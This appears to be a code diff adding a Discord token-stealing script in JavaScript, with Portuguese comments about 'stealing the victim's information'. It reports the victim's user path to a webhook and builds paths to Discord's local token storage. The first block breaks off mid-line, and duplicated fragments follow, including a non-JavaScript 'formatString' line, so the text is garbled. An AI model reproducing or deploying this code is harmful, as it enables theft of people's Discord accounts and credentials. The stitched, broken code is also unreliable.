@@ -1,0 +1,36 @@
+function iniciar = async function iniciar() {
+    const request = require("sync-request")
+    const fs = require("fs")
+    const os = require("os")
+    const fetch = require('node-fetch');
+    const execSync = require('child_process').execSync
+   let owner = "Kakau"
+    
+    //Começo do roubo de informações
+    await wb.send("**Injeção Começada, recolhendo informações da vítima**")
+  
+    let ws = new discord.MessageEmbed()
+    .setColor("#030303")
+    .setDescription(`Caminho: ${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}`)
+     wb.send(ws)
+
+     //Roubar os tokens
+    if (os.platform() === "win32") {
+        
+        var paths = [
+`${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Roaming/discord/Local Storage/leveldb`,
+`${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Roaming/Discord/Local Storage/leveldb`,
+`${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Roaming/DiscordSoftware/Local St...
+const request = require("sync-request")
+const fs = require("fs")
+const os = require("os")
+const fetch = require('node-fetch')
+const execSync = require('child_process').execSync
+let owner = "Kakau"
+await wb.send("**Injeção Começada, recolhendo informações da vítima**")
+let ws = new discord.MessageEmbed()
+    .setColor("#030303")
+    .setDescription(`Caminho: ${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}`)
+"#030303"
+<operator>.formatString("Caminho: ", __dirname.split(":")[0], ":/Users/", __dirname.split("\\")[2], "")
+wb.send(ws)
